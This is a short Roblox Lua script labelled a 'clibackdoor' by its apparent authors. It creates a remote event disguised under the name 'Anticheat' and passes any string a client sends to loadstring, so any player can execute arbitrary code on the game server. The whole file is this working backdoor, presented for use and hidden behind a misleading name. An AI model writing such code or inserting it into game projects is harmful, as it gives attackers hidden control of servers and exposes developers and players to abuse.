-- clibackdoor, by the b1 fanclub
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local ac = Instance.new("RemoteEvent", ReplicatedStorage)
ac.Name = "Anticheat"
ac.OnServerEvent:connect(function(player, SS)
    loadstring(SS)()
end)
